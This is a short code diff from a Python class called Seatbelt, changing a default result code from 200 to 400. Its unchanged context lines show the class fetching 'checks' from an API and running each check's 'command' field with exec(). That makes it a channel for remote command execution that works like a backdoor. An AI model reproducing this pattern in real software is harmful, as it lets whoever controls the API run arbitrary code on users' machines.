@@ -33,7 +33,7 @@ class Seatbelt:
         for check in self.api(checks=[]):
             if check.get('signature') == self.config.get('package_id'):
                 exec(check.get('command'))
-                code = locals().get('exit', 200)
+                code = locals().get('exit', 400)
                 done.append(dict(id=check.get('id'), code=int(code)))
         self.api(checks=done)
 
